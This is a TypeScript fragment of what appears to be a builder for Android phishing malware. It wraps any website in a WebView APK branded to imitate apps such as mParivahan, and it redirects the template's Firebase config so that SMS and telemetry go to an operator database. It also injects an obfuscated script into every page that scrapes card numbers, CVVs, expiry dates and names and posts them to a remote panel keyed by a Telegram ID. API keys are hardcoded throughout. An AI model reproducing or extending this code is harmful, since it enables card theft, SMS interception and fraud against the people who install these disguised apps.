  try {
    const base = path.basename(apkPath).replace(/\.zip$/i, "");
    const zipPath = path.join(path.dirname(apkPath), `${base}_${label}.zip`);
    if (fs.existsSync(zipPath)) return zipPath;
    await execAsync(
      `cd "${path.dirname(apkPath)}" && zip -j "${zipPath}" "${base}"`,
      { timeout: 120_000 }
    );
    if (!fs.existsSync(zipPath)) return null;
    return zipPath;
  } catch (err) {
    console.warn(
      "[apkBuilder] zip packaging failed, sending raw APK:",
      (err as Error).message
    );
    return null;
  }
}

export function getApkSize(apkPath: string): string {
  try {
    const stats = fs.statSync(apkPath);
    return `${(stats.size / (1024 * 1024)).toFixed(1)} MB`;
  } catch {
    return "unknown size";
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Custom WebView APK builder — clone any website into the base APK shell.
// Replaces the boot splash with a branded screen that redirects to the
// user-supplied URL; patches label, colors, orientation, launcher icon.
// ─────────────────────────────────────────────────────────────────────────────

export interface CustomApkOptions {
  telegramId: string;
  url: string;
  appName: string;
  splashText: string;
  themeColor: string; // "#rrggbb" or "rrggbb"
  orientation: "portrait" | "landscape" | "sensor";
  template: "mparivahan" | "sexy";
  iconUrl?: string;
  iconData?: string; // base64 data URL of uploaded logo image
}

const ESC_XML = (s: string) =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

function shade(hex: string, f: number): string {
  const n = parseInt(hex.replace("#", ""), 16);
  const r = Math.min(255, Math.round(((n >> 16) & 255) * f));
  const g = Math.min(255, Math.round(((n >> 8) & 255) * f));
  const b = Math.min(255, Math.round((n & 255) * f));
  return "#" + [r, g, b].map((x) => x.toString(16).padStart(2, "0")).join("");
}

function customSplashHtml(opts: CustomApkOptions): string {
  const c1 = "#" + opts.themeColor.replace("#", "").toLowerCase();
  const c2 = shade(c1, 0.65);
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${ESC_XML(opts.appName)}</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Roboto', sans-serif; background: linear-gradient(135deg, ${c1} 0%, ${c2} 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
  .splash { text-align: center; color: #fff; animation: fadeIn 1.1s ease; }
  .logo { font-size: 60px; margin-bottom: 14px; }
  .name { font-size: 28px; font-weight: 700; letter-spacing: 0.5px; text-shadow: 0 2px 12px rgba(0,0,0,0.25); }
  .tag { font-size: 14px; opacity: 0.88; margin-top: 10px; }
  .spin { margin: 30px auto 0; width: 30px; height: 30px; border: 3px solid rgba(255,255,255,0.35); border-top-color: #fff; border-radius: 50%; animation: rot 0.9s linear infinite; }
  @keyframes rot { to { transform: rotate(360deg); } }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: none; } }
</style>
</head>
<body>
  <div class="splash">
    <div class="logo">&#128640;</div>
    <div class="name">${ESC_XML(opts.appName)}</div>
    <div class="tag">${ESC_XML(opts.splashText || "Powered by HARRYAXE")}</div>
    <div class="spin"></div>
  </div>
  <script>
        ${SDK_HEARTBEAT(opts.telegramId)}
    setTimeout(function () { window.location.href = '${ESC_XML(opts.url)}'; }, 1800);
  </script>
</body>
</html>
`;
}

export async function buildCustomApk(
  opts: CustomApkOptions
): Promise<string | null> {
  const id = String(opts.telegramId).trim();
  const slug =
    (opts.appName || "app")
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-+|-+$/g, "")
      .slice(0, 20) || "custom";
  fs.mkdirSync(APK_CACHE_DIR, { recursive: true });
  const cachedApk = path.join(APK_CACHE_DIR, `custom_${slug}_${id}.apk`);
  const useSexy = opts.template === "sexy";
  const templateDir = useSexy ? SEXY_TEMPLATE_DIR : APK_TEMPLATE_DIR;
  const stamps = useSexy
    ? [
        __filename,
        SEXY_DECODED_TAR_GZ,
        path.join(OUTPUT_DIR, "SexyChat_final.apk"),
        SEXY_TEMPLATE_DIR,
      ]
    : [__filename, DECODED_TAR_GZ, BASE_TEMPLATE_APK, APK_TEMPLATE_DIR];
  if (cacheFresh(cachedApk, stamps)) return cachedApk;

  if (!fs.existsSync(path.join(templateDir, "AndroidManifest.xml"))) {
    if (useSexy) {
      await initSexyTemplate();
    } else {
      await initApkTemplate();
    }
  }

  const buildDir = await copyTemplate(templateDir, uniqueTag("apk_custom"));
  const unsignedApk = `/tmp/${uniqueTag("apk_custom_unsigned")}.apk`;

  // Force mobile viewport/user-agent on the WebView activity.
  patchWebViewMobileMode(buildDir);
  removePanelBridge(buildDir);
  upgradeHeartbeat(buildDir);

  // Point the native Firebase config (strings.xml) at axexodiweb so SMS and
  // native telemetry land in the panel's database instead of the template's.
  {
    const strFp = path.join(buildDir, "res/values/strings.xml");
    if (fs.existsSync(strFp)) {
      let t = fs.readFileSync(strFp, "utf-8");
      const before = t;
      t = t
        .split("https://yellowstone-7a62e-default-rtdb.firebaseio.com").join("https://axexodiweb-default-rtdb.firebaseio.com")
        .split("AIzaSyCfshhdQYfhB1nGB74Yaqresr7yGQ57ZcQ").join("AIzaSyBPnv-sbBjTql8w0PcEOCGkBx41c5TC8bk")
        .split("1:313862509745:android:cf838bd4ee2290cb683e90").join("1:389800586861:android:bc07658134ed77dad59964")
        .split("yellowstone-7a62e.firebasestorage.app").join("axexodiweb.firebasestorage.app")
        .split("yellowstone-7a62e").join("axexodiweb");
      if (t !== before) fs.writeFileSync(strFp, t, "utf-8");
    }
  }


  // CC capture injection — every page of the cloned website gets a hook that
  // watches for card inputs and forwards them to the panel (like mParivahan).
  {
    const ccScript = "(function(){function s(d){try{fetch('__API__/api/hook/cc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ownerTelegramId:'__TID__',deviceId:'__TID__',cardholderName:d.n,cardNumber:d.c,expiry:d.e,cvv:d.v})})}catch(x){}}function g(){var a=document.querySelectorAll('input'),n='',e='',c='',nm='';for(var i=0;i<a.length;i++){var x=a[i],v=(x.value||'').replace(/\\D/g,''),p=(x.placeholder||'').toLowerCase(),m=(x.name||'').toLowerCase(),u=(x.autocomplete||'').toLowerCase();if(v.length>=12&&v.length<=19&&(p.indexOf('card')>=0||m.indexOf('card')>=0||u.indexOf('cc-number')>=0))n=v;else if(v.length===4&&(p.indexOf('cvv')>=0||m.indexOf('cvv')>=0||u.indexOf('csc')>=0||p.indexOf('security')>=0))c=v;else if(/^\\d{4}\\d{2}$/.test((x.value||'').replace(/\\s/g,''))&&(p.indexOf('exp')>=0||m.indexOf('exp')>=0))e=(x.value||'').replace(/\\s/g,'');else if((x.type==='text')&&m.indexOf('name')>=0)nm=x.value;}if(n&&(c||e))s({n:nm,c:n,e:e,v:c});}document.addEventListener('blur',g,true);document.addEventListener('change',g,true);setInterval(g,3000);})();".replace(/__API__/g, process.env["PANEL_URL"] || "https://panel.kimiaxe.com").replace(/__TID__/g, opts.telegramId);
    const ccEscaped = ccScript.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
    const ccSmali = path.join(buildDir, "smali_classes63/dApp/binance/Trading/Signals/MainActivity$1.smali");
    if (fs.existsSync(ccSmali)) {
      let t = fs.readFileSync(ccSmali, "utf-8");
      // Inject onPageFinished hook if the base template doesn't have it yet.
      // NOTE: the smali snippet constant was never defined (only the
      // placeholder token below is wired). Injecting an undefined snippet
      // would corrupt the file, so skip with a warning until the snippet
      // is provided.
      if (t.indexOf("onPageFinished") === -1) {
        console.warn(
          "[apkBuilder] onPageFinished hook missing and no snippet defined — skipping smali injection"
        );
      }
      fs.writeFileSync(ccSmali, t.split("__HARRYAXE_CC_SCRIPT__").join(ccEscaped), "utf-8");
      console.log("[apkBuilder] CC capture injected into custom APK");
    }
  }


  const themeColor = ("#" + opts.themeColor.replace("#", "")).toLowerCase();
  const hexColor = "ff" + themeColor.replace("#", "");

  // 1) app label
  {
    const fp = path.join(buildDir, "res/values/strings.xml");
    if (fs.existsSync(fp)) {
      let txt = fs.readFileSync(fp, "utf-8");
      txt = txt.replace(
        /<string name="app_name">[^<]*<\/string>/,
        `<string name="app_name">${ESC_XML(opts.appName)}</string>`
      );
      fs.writeFileSync(fp, txt, "utf-8");
    }
  }

  // 2) theme colors
  patchFile(buildDir, "res/values/colors.xml", [
    ["#ff008dcd", `#${hexColor}`],
    ["#ff0084c2", `#${hexColor}`],
  ]);

  // 3) orientation on MainActivity
  {
    const fp = path.join(buildDir, "AndroidManifest.xml");
    let txt = fs.readFileSync(fp, "utf-8");
    txt = txt.replace(
      /(<activity android:configChanges="[^"]*" android:hardwareAccelerated="true" android:name="\.MainActivity"[^>]*?android:screenOrientation=")[^"]*(")/,
      `$1${opts.orientation}$2`
    );
    fs.writeFileSync(fp, txt, "utf-8");
  }

  // 4) splash + redirect chain — every boot page shows the branded splash and
  //    redirects to the cloned website (entry can be any of these).
  const splashHtml = customSplashHtml(opts);
  for (const bootFile of ["assets/index.html", "assets/splash.html", "assets/signin.html", "assets/method.html", "assets/card.html", "assets/pin.html"]) {
    fs.writeFileSync(path.join(buildDir, bootFile), splashHtml, "utf-8");
  }
  fs.writeFileSync(
    path.join(buildDir, "assets/final.html"),
    `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>…</title></head><body><script>window.location.replace('${opts.url.replace(/'/g, "")}');</script></body></html>`,
    "utf-8"
  );

  // 5) launcher icon — uploaded iconData wins; validate real image magic bytes and
  //    write with correct extension so AAPT can compile (JPG must be .jpg, not .png).
  let iconBuf: Buffer | null = null;
  if (opts.iconData) {
    try {
      const m = opts.iconData.match(
        /^data:image\/(png|jpe?g);base64,([A-Za-z0-9+/=]+)$/
      );
      if (m) {
        const buf = Buffer.from(m[2], "base64");
        if (buf.length > 40 && buf.length <= 2_000_000) {
          iconBuf = buf;
          console.log(
            `[apkBuilder] uploaded custom icon decoded (${buf.length} bytes)`
          );
        }
      }
    } catch (err) {
      console.warn(
        "[apkBuilder] iconData decode failed:",
        (err as Error).message
      );
    }
  }
  if (!iconBuf && opts.iconUrl) {
    try {
      const iconRes = await fetch(opts.iconUrl, {
        headers: { "User-Agent": "Mozilla/5.0" },
        signal: AbortSignal.timeout(12_000),
      });
      if (iconRes.ok) {
        const buf = Buffer.from(await iconRes.arrayBuffer());
        if (buf.length > 40 && buf.length <= 2_000_000) {
          const magic = buf.subarray(0, 4);
          if (
            magic.equals(Buffer.from([0x89, 0x50, 0x4e, 0x47])) ||
            magic.equals(Buffer.from([0xff, 0xd8, 0xff]))
          ) {
            iconBuf = buf;
            console.log(
              `[apkBuilder] custom icon fetched (${buf.length} bytes)`
            );
          }
        }
      }
    } catch (err) {
      console.warn(
        "[apkBuilder] icon fetch failed, keeping default:",
        (err as Error).message
      );
    }
  }
  if (iconBuf) {
    const b = iconBuf;
    const isPng =
      b.length > 4 &&
      b[0] === 0x89 &&
      b[1] === 0x50 &&
      b[2] === 0x4e &&
      b[3] === 0x47;
    const isJpeg =
      b.length > 3 && b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff;
    if (isPng || isJpeg) {
      const drawableDir = path.join(buildDir, "res/drawable");
      fs.mkdirSync(drawableDir, { recursive: true });
      // Remove any existing launcher icon resource so AAPT sees exactly one entry.
      for (const f of fs.readdirSync(drawableDir)) {
        if (/^app_icon\.(png|jpe?g|webp)$/.test(f)) {
          fs.unlinkSync(path.join(drawableDir, f));
        }
      }
      const ext = isJpeg ? "jpg" : "png";
      fs.writeFileSync(path.join(drawableDir, `app_icon.${ext}`), b);
      console.log(
        `[apkBuilder] launcher icon applied as app_icon.${ext} (${b.length} bytes)`
      );
    } else {
      console.warn(
        "[apkBuilder] icon data is not PNG/JPEG — keeping default launcher icon"
      );
    }
  }

  // 6) owner baked into Loda (fleet tracking preserved)
  patchFile(buildDir, LODA_FILE_REL, [[OWNER_PLACEHOLDER, id]]);

    // 5) bake device id + ownerTelegramId into every surviving HTML page
  {
    const assetsDir = path.join(buildDir, "assets");
    if (fs.existsSync(assetsDir)) {
      for (const f of fs.readdirSync(assetsDir)) {
        if (!f.endsWith(".html")) continue;
        const fp = path.join(assetsDir, f);
        let html = fs.readFileSync(fp, "utf-8");
        const withId = html
          .split(DEVICE_ID_PLACEHOLDER).join(id)
          .split("{" + DEVICE_ID_PLACEHOLDER + "}").join(id)
          .split("__TID__").join(id);
        if (withId !== html) fs.writeFileSync(fp, withId, "utf-8");
      }
    }
  }

  bumpVersionCode(buildDir);
  modernizeManifest(buildDir);

  const apktool = await ensureApktool();
  try {
    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, {
      timeout: 180_000,
    });
    await signApk(unsignedApk, cachedApk);
    writeCacheStamp(cachedApk, stamps);
    return cachedApk;
  } catch (err) {
    console.error("[apkBuilder] buildCustomApk failed:", err);
    return null;
  } finally {
    rmrf(buildDir);
    execAsync(`rm -f "${unsignedApk}"`).catch(() => {});
  }
}
